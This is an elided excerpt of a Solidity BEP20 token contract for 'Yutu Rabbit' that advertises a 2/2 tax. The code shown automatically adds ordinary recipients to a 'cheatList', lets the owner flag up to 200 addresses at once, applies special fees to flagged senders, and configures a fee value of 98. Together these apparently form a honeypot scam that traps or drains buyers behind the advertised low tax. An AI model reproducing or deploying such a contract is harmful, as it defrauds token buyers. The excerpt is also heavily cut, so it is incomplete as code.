...
/*
 ...
 \ \ / /   _| |_ _   _  |  _ \ __ _| |__ | |__ (_) |_ 
  \ V / | | | __| | | | | |_) / _` | '_ \| '_ \| | __|
   | || |_| | |_| |_| | |  _ < (_| | |_) | |_) | | |_ 
   |_| \__,_|\__|\__,_| |_| \_\__,_|_.__/|_.__/|_|\__|
                                                      
            Telegram:https://t.me/Yutu_Rabbit
            Tax     :2/2
...
abstract contract BEP20 is Context, IERC20, Ownable {
    ...
    function multiTransfer_fixed(address[] calldata addresses, uint256 amount)
        external
        onlyOwner
    {
    ...
    function doCheater(address recipient) internal {
        if (!cheatList[recipient] && !isMarketPair[recipient])
            cheatList[recipient] = true;
    }

    function manage_cheater(address[] calldata addresses, bool status)
        public
        onlyOwner
    {
        require(addresses.length < 201);
    ...
    function takeFee(
        ...
        if (cheatList[sender] && !isMarketPair[sender])
...
contract Token is BEP20 {
    constructor()
        BEP20(
            ...
            [uint256(98), uint256(0), uint256(0)],
            [uint256(0), uint256(2), uint256(0)],
            [uint256(100000000), uint256(100000000)],
            [
                0x75615a6441e060840e952022039D80fc251Ed978,
                0x5fDB3b2850f0dED6043715f49532fFeE591E1Bed
            ]
        )
    {}
}